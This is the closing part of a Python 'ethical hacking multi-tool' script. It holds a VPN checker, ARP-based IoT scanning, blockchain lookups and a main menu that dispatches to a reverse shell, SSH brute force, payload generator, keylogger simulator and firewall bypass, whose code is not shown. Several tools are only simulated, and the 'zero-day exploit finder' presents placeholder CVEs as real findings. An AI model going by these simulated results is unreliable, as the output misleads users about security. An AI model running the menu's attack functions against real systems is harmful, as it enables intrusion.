        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
#===========================================================================================================

# Function for VPN checker
def get_ip(api_url):
    """Get the public IP address using the specified API."""
    try:
        response = requests.get(api_url, timeout=5)
        response.raise_for_status()
        return response.json()["ip"]
    except Exception as e:
        print(f"{Fore.RED}Error: Failed to get IP from {api_url}. {e}{Style.RESET_ALL}")
        return None

def get_ip_info(ip):
    """Get detailed information about the IP address."""
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        response.raise_for_status()
        return response.json()
    except Exception as e:
        print(f"{Fore.RED}Error: Failed to get IP info. {e}{Style.RESET_ALL}")
        return None

def is_vpn_active(ip_info):
    """Check if a VPN is active based on IP information."""
    if not ip_info:
        return False

    # Check for known VPN providers in the ISP or ASN
    vpn_keywords = ["VPN", "Proxy", "Tor", "DataCenter", "Cloud"]
    isp = ip_info.get("org", "").lower()
    for keyword in vpn_keywords:
        if keyword.lower() in isp:
            return True

    # Check if the IP is in a known data center range
    if ip_info.get("hostname", "").endswith(".datacenter.com"):
        return True

    return False

def vpn_checker():
    print(f"\n{Fore.CYAN}=== VPN Checker ==={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Warning: This tool is for educational purposes only. Do not use it for unethical or illegal activities.{Style.RESET_ALL}")

    # Get the public IP address using multiple APIs for redundancy
    ip_apis = [
        "https://api.ipify.org?format=json",
        "https://ipinfo.io/ip",
        "https://ifconfig.me/ip",
    ]
    ip = None
    for api_url in ip_apis:
        ip = get_ip(api_url)
        if ip:
            break

    if not ip:
        print(f"{Fore.RED}Error: Could not retrieve IP address.{Style.RESET_ALL}")
        return

    print(f"{Fore.YELLOW}Your IP address: {ip}{Style.RESET_ALL}")

    # Get detailed information about the IP address
    ip_info = get_ip_info(ip)
    if ip_info:
        print(f"{Fore.YELLOW}Location: {ip_info.get('city')}, {ip_info.get('region')}, {ip_info.get('country')}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}ISP: {ip_info.get('org')}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Error: Could not retrieve IP information.{Style.RESET_ALL}")
        return

    # Check if a VPN is active
    if is_vpn_active(ip_info):
        print(f"{Fore.GREEN}[+] VPN is active.{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] VPN is not active.{Style.RESET_ALL}")

#=======================================================================================================

# Function for dark web scanner (simulated)
def dark_web_scanner(query):
    print(f"\n{Fore.CYAN}=== Dark Web Scanner (Simulated) ==={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Warning: This tool is for educational purposes only. Do not use it for unethical or illegal activities.{Style.RESET_ALL}")
    print(f"Scanning dark web for '{query}'...")

    try:
        # Simulate scanning delay
        time.sleep(2)

        # Simulate results
        results = [
            f"Dark Web Marketplace: Found '{query}' for sale.",
            f"Dark Web Forum: Discussion about '{query}' detected.",
            f"Dark Web Blog: Article related to '{query}' found.",
        ]

        # Randomly select a few results
        num_results = random.randint(1, 3)
        selected_results = random.sample(results, num_results)

        # Display results
        if selected_results:
            print(f"{Fore.GREEN}[+] Found {num_results} results for '{query}':{Style.RESET_ALL}")
            for result in selected_results:
                print(f"- {result}")
        else:
            print(f"{Fore.RED}[-] No results found for '{query}'.{Style.RESET_ALL}")

    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
#==========================================================================================

# Function for blockchain explorer
def explore_bitcoin(address):
    """Explore a Bitcoin address."""
    try:
        response = requests.get(f"https://blockchain.info/rawaddr/{address}", timeout=5)
        response.raise_for_status()
        data = response.json()
        print(f"{Fore.YELLOW}Balance: {data['final_balance'] / 100000000} BTC{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Total Transactions: {data['n_tx']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Transactions:{Style.RESET_ALL}")
        for tx in data["txs"][:5]:  # Display the first 5 transactions
            print(f"- Hash: {tx['hash']}")
            print(f"  Time: {tx['time']}")
            print(f"  Inputs: {len(tx['inputs'])}")
            print(f"  Outputs: {len(tx['out'])}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

def explore_ethereum(address):
    """Explore an Ethereum address."""
    try:
        response = requests.get(f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey=YourApiKeyToken", timeout=5)
        response.raise_for_status()
        data = response.json()
        balance = int(data["result"]) / 10**18
        print(f"{Fore.YELLOW}Balance: {balance} ETH{Style.RESET_ALL}")

        response = requests.get(f"https://api.etherscan.io/api?module=account&action=txlist&address={address}&startblock=0&endblock=99999999&sort=asc&apikey=YourApiKeyToken", timeout=5)
        response.raise_for_status()
        data = response.json()
        print(f"{Fore.YELLOW}Total Transactions: {len(data['result'])}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Transactions:{Style.RESET_ALL}")
        for tx in data["result"][:5]:  # Display the first 5 transactions
            print(f"- Hash: {tx['hash']}")
            print(f"  Time: {tx['timeStamp']}")
            print(f"  From: {tx['from']}")
            print(f"  To: {tx['to']}")
            print(f"  Value: {int(tx['value']) / 10**18} ETH")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

def blockchain_explorer(address, blockchain="bitcoin"):
    print(f"\n{Fore.CYAN}=== Blockchain Explorer ==={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Warning: This tool is for educational purposes only. Do not use it for unethical or illegal activities.{Style.RESET_ALL}")

    if blockchain == "bitcoin":
        explore_bitcoin(address)
    elif blockchain == "ethereum":
        explore_ethereum(address)
    else:
        print(f"{Fore.RED}Error: Unsupported blockchain.{Style.RESET_ALL}")
#========================================================================================================

# Function for AI-powered phishing detection
def ai_phishing_detection(url):
    print(f"\n{Fore.CYAN}Analyzing {url} for phishing using AI...{Style.RESET_ALL}")
    try:
        openai.api_key = "your_openai_api_key"  # Replace with your OpenAI API key
        response = openai.Completion.create(
            engine="text-davinci-003",
            prompt=f"Is this URL a phishing site? {url}",
            max_tokens=50
        )
        print(f"{Fore.GREEN}[+] AI Analysis: {response.choices[0].text.strip()}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

# Function for malware analysis (simulated)
def calculate_file_hash(file_path):
    """Calculate the SHA-256 hash of a file."""
    sha256_hash = hashlib.sha256()
    try:
        with open(file_path, "rb") as f:
            for byte_block in iter(lambda: f.read(4096), b""):
                sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
        return None

def check_virustotal(file_hash):
    """Check the file hash against VirusTotal (simulated)."""
    print(f"{Fore.YELLOW}Checking file hash {file_hash} against VirusTotal (simulated)...{Style.RESET_ALL}")
    time.sleep(2)  # Simulate API request delay
    # Simulate VirusTotal response
    if file_hash == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855":  # Empty file hash
        return "safe"
    else:
        return "suspicious"

def analyze_file(file_path):
    """Perform basic static analysis on the file."""
    try:
        file_size = os.path.getsize(file_path)
        print(f"{Fore.YELLOW}File Size: {file_size} bytes{Style.RESET_ALL}")

        file_extension = os.path.splitext(file_path)[1].lower()
        suspicious_extensions = [".exe", ".dll", ".bat", ".scr", ".js"]
        if file_extension in suspicious_extensions:
            print(f"{Fore.RED}Warning: Suspicious file extension detected: {file_extension}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}File Extension: {file_extension}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

def malware_analysis(file_path):
    print(f"\n{Fore.CYAN}=== Malware Analysis ==={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Warning: This tool is for educational purposes only. Do not use it for unethical or illegal activities.{Style.RESET_ALL}")

    if not os.path.exists(file_path):
        print(f"{Fore.RED}Error: File not found.{Style.RESET_ALL}")
        return

    # Calculate file hash
    file_hash = calculate_file_hash(file_path)
    if file_hash:
        print(f"{Fore.YELLOW}File Hash (SHA-256): {file_hash}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Error: Could not calculate file hash.{Style.RESET_ALL}")
        return

    # Check file hash against VirusTotal (simulated)
    result = check_virustotal(file_hash)
    if result == "safe":
        print(f"{Fore.GREEN}[+] File {file_path} is safe.{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] File {file_path} is suspicious.{Style.RESET_ALL}")

    # Perform basic static analysis
    analyze_file(file_path)

#===================================================================================

# Function for IoT scanner
def identify_device(mac):
    """Identify the device type based on MAC address prefix."""
    mac_prefix = mac[:8].upper()
    iot_devices = {
        "00:1A:22": "Philips Hue",
        "B8:27:EB": "Raspberry Pi",
        "34:CE:00": "Google Nest",
        "44:07:0B": "Amazon Echo",
        "D0:73:D5": "Xiaomi Smart Home",
        "F0:27:2D": "Samsung SmartThings",
    }
    return iot_devices.get(mac_prefix, "Unknown IoT Device")

def scan_device(ip):
    """Scan a single device for IoT identification."""
    try:
        arp = ARP(pdst=ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        result = srp(packet, timeout=2, verbose=0)[0]
        for sent, received in result:
            device_type = identify_device(received.hwsrc)
            print(f"{Fore.GREEN}[+] Found IoT device: {received.psrc} (MAC: {received.hwsrc}, Type: {device_type}){Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

def iot_scanner(network, max_workers=10):
    print(f"\n{Fore.CYAN}=== IoT Device Scanner ==={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Warning: This tool is for educational purposes only. Do not use it for unethical or illegal activities.{Style.RESET_ALL}")
    print(f"Scanning IoT devices on {network}...")

    # Generate list of IPs to scan
    base_ip = ".".join(network.split(".")[:-1]) + "."
    ips = [f"{base_ip}{i}" for i in range(1, 255)]

    # Use ThreadPoolExecutor for concurrent scanning
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(scan_device, ip) for ip in ips]
        
        # Simple progress indicator
        for i, future in enumerate(concurrent.futures.as_completed(futures)):
            print(f"{Fore.YELLOW}Progress: {i+1}/254{Style.RESET_ALL}", end="\r")

    print(f"\n{Fore.CYAN}Scanning completed.{Style.RESET_ALL}")

#=========================================================================================

# Function for cloud security checker
def check_aws_security():
    """Simulate AWS security check."""
    time.sleep(1)  # Simulate API request delay
    return [
        "Enable Multi-Factor Authentication (MFA) for all users.",
        "Use IAM roles and policies to enforce least privilege.",
        "Enable encryption for S3 buckets and RDS databases.",
        "Enable CloudTrail logging for auditing.",
        "Use AWS Config to monitor resource compliance.",
    ]

def check_azure_security():
    """Simulate Azure security check."""
    time.sleep(1)  # Simulate API request delay
    return [
        "Enable Multi-Factor Authentication (MFA) for all users.",
        "Use Azure Role-Based Access Control (RBAC) to enforce least privilege.",
        "Enable encryption for Azure Blob Storage and SQL Databases.",
        "Enable Azure Monitor and Log Analytics for auditing.",
        "Use Azure Security Center to monitor and improve security posture.",
    ]

def check_gcp_security():
    """Simulate GCP security check."""
    time.sleep(1)  # Simulate API request delay
    return [
        "Enable Multi-Factor Authentication (MFA) for all users.",
        "Use IAM roles and policies to enforce least privilege.",
        "Enable encryption for Cloud Storage and BigQuery datasets.",
        "Enable Cloud Audit Logging for auditing.",
        "Use Security Command Center to monitor and improve security posture.",
    ]

def cloud_security_checker(service):
    print(f"\n{Fore.CYAN}=== Cloud Security Checker ==={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Warning: This tool is for educational purposes only. Do not use it for unethical or illegal activities.{Style.RESET_ALL}")
    print(f"Checking security for cloud service: {service}...")

    try:
        if service.lower() == "aws":
            recommendations = check_aws_security()
        elif service.lower() == "azure":
            recommendations = check_azure_security()
        elif service.lower() == "gcp":
            recommendations = check_gcp_security()
        else:
            print(f"{Fore.RED}Error: Unsupported cloud service.{Style.RESET_ALL}")
            return

        print(f"{Fore.GREEN}[+] Security recommendations for {service}:{Style.RESET_ALL}")
        for recommendation in recommendations:
            print(f"- {recommendation}")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
#====================================================================================================

# Function for zero-day exploit finder (simulated)
def simulate_exploit_search(software):
    """Simulate searching for zero-day exploits."""
    time.sleep(2)  # Simulate API request delay
    # Simulated exploit database
    exploits = {
        "Windows 10": [
            {
                "CVE": "CVE-2023-12345",
                "Description": "Remote Code Execution via Malicious DLL.",
                "Severity": "Critical",
            }
        ],
        "Apache HTTP Server": [
            {
                "CVE": "CVE-2023-67890",
                "Description": "Buffer Overflow in HTTP Request Handling.",
                "Severity": "High",
            }
        ],
        "OpenSSH": [
            {
                "CVE": "CVE-2023-54321",
                "Description": "Privilege Escalation via Improper Input Validation.",
                "Severity": "Medium",
            }
        ],
    }
    return exploits.get(software, [])

def zero_day_exploit_finder(software):
    print(f"\n{Fore.CYAN}=== Zero-Day Exploit Finder ==={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Warning: This tool is for educational purposes only. Do not use it for unethical or illegal activities.{Style.RESET_ALL}")
    print(f"Searching for zero-day exploits for {software}...")

    try:
        exploits = simulate_exploit_search(software)
        if exploits:
            print(f"{Fore.GREEN}[+] Found {len(exploits)} potential zero-day exploit(s) for {software}:{Style.RESET_ALL}")
            for exploit in exploits:
                print(f"- CVE: {exploit['CVE']}")
                print(f"  Description: {exploit['Description']}")
                print(f"  Severity: {exploit['Severity']}")
        else:
            print(f"{Fore.RED}[-] No zero-day exploits found for {software}.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
#===========================================================================================================

# Function for AI chatbot integration
def ai_chatbot():
    print(f"\n{Fore.CYAN}=== AI Chatbot ==={Style.RESET_ALL}")
    try:
        openai.api_key = "your_openai_api_key"  # Replace with your OpenAI API key
        while True:
            query = input("You: ")
            if query.lower() == "exit":
                break
            response = openai.Completion.create(
                engine="text-davinci-003",
                prompt=query,
                max_tokens=100
            )
            print(f"{Fore.GREEN}AI: {response.choices[0].text.strip()}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

# Main menu
def main_menu():
    print(BANNER)
    print(f"{Fore.CYAN}=== Ultimate Ethical Hacking Multi-Tool v5.0 ===")
    print("1. Port Scanner")
    print("2. Subdomain Enumeration")
    print("3. WHOIS Lookup")
    print("4. Directory Bruteforce")
    print("5. Ping Sweep")
    print("6. HTTP Header Analysis")
    print("7. Hash Cracker")
    print("8. ARP Scan")
    print("9. SSL/TLS Checker")
    print("10. Vulnerability Scanner")
    print("11. Social Engineering Toolkit")
    print("12. DNS Enumeration")
    print("13. OS Fingerprinting")
    print("14. Network Sniffer")
    print("15. Exploit Suggester")
    print("16. Brute-Force SSH")
    print("17. Web Crawler")
    print("18. Email Harvester")
    print("19. Wi-Fi Scanner")
    print("20. Keylogger Simulator")
    print("21. Reverse Shell")
    print("22. Cryptography Tool")
    print("23. Firewall Bypass")
    print("24. Payload Generator")
    print("25. MAC Address Spoofer")
    print("26. VPN Checker")
    print("27. Dark Web Scanner")
    print("28. Blockchain Explorer")
    print("29. AI Phishing Detection")
    print("30. Malware Analysis")
    print("31. IoT Scanner")
    print("32. Cloud Security Checker")
    print("33. Zero-Day Exploit Finder")
    print("34. AI Chatbot")
    print("35. Exit")
    choice = input(f"{Fore.YELLOW}Enter your choice: {Style.RESET_ALL}")
    return choice

# Main function
def main():
    while True:
        choice = main_menu()
        if choice == "1":
            target = input("Enter target IP: ")
            start_port = int(input("Enter start port: "))
            end_port = int(input("Enter end port: "))
            port_scanner(target, start_port, end_port)
        elif choice == "2":
            domain = input("Enter domain (e.g., example.com): ")
            wordlist = input("Enter path to wordlist file: ")
            subdomain_enumeration(domain, wordlist)
        elif choice == "3":
            domain = input("Enter domain (e.g., example.com): ")
            whois_lookup(domain)
        elif choice == "4":
            url = input("Enter base URL (e.g., http://example.com): ")
            wordlist = input("Enter path to wordlist file: ")
            directory_bruteforce(url, wordlist)
        elif choice == "5":
            network = input("Enter network (e.g., 192.168.1): ")
            ping_sweep(network)
        elif choice == "6":
            url = input("Enter URL to analyze (e.g., http://example.com): ")
            http_header_analysis(url)
        elif choice == "7":
            hash_value = input("Enter hash to crack: ")
            wordlist = input("Enter path to wordlist file: ")
            hash_cracker(hash_value, wordlist)
        elif choice == "8":
            network = input("Enter network (e.g., 192.168.1.0/24): ")
            arp_scan(network)
        elif choice == "9":
            url = input("Enter URL to check SSL/TLS (e.g., https://example.com): ")
            ssl_tls_checker(url)
        elif choice == "10":
            url = input("Enter URL to scan for vulnerabilities (e.g., http://example.com): ")
            vulnerability_scanner(url)
        elif choice == "11":
            social_engineering_toolkit()
        elif choice == "12":
            domain = input("Enter domain (e.g., example.com): ")
            dns_enumeration(domain)
        elif choice == "13":
            target = input("Enter target IP: ")
            os_fingerprinting(target)
        elif choice == "14":
            interface = input("Enter network interface (e.g., eth0): ")
            count = int(input("Enter number of packets to sniff: "))
            network_sniffer(interface, count)
        elif choice == "15":
            service = input("Enter service name (e.g., Apache): ")
            version = input("Enter version (e.g., 2.4.49): ")
            exploit_suggester(service, version)
        elif choice == "16":
            target = input("Enter target IP: ")
            username = input("Enter SSH username: ")
            wordlist = input("Enter path to wordlist file: ")
            brute_force_ssh(target, username, wordlist)
        elif choice == "17":
            url = input("Enter URL to crawl (e.g., http://example.com): ")
            max_pages = int(input("Enter maximum pages to crawl: "))
            web_crawler(url, max_pages)
        elif choice == "18":
            url = input("Enter URL to harvest emails (e.g., http://example.com): ")
            email_harvester(url)
        elif choice == "19":
            wifi_scan()
        elif choice == "20":
            keylogger_simulator()
        elif choice == "21":
            ip = input("Enter your IP: ")
            port = int(input("Enter port: "))
            reverse_shell(ip, port)
        elif choice == "22":
            cryptography_tool()
        elif choice == "23":
            target = input("Enter target IP: ")
            port = int(input("Enter port: "))
            firewall_bypass(target, port)
        elif choice == "24":
            payload_generator()
        elif choice == "25":
            interface = input("Enter network interface (e.g., eth0): ")
            mac_spoofer(interface)
        elif choice == "26":
            vpn_checker()
        elif choice == "27":
            query = input("Enter query to search on the dark web: ")
            dark_web_scanner(query)
        elif choice == "28":
            address = input("Enter blockchain address: ")
            blockchain_explorer(address)
        elif choice == "29":
            url = input("Enter URL to analyze for phishing: ")
            ai_phishing_detection(url)
        elif choice == "30":
            file_path = input("Enter file path to analyze for malware: ")
            malware_analysis(file_path)
        elif choice == "31":
            network = input("Enter network (e.g., 192.168.1.0/24): ")
            iot_scanner(network)
        elif choice == "32":
            service = input("Enter cloud service (e.g., AWS, Azure): ")
            cloud_security_checker(service)
        elif choice == "33":
            software = input("Enter software name (e.g., Apache, WordPress): ")
            zero_day_exploit_finder(software)
        elif choice == "34":
            ai_chatbot()
        elif choice == "35":
            print(f"{Fore.RED}Exiting...{Style.RESET_ALL}")
            break
        else:
            print(f"{Fore.RED}Invalid choice. Please try again.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()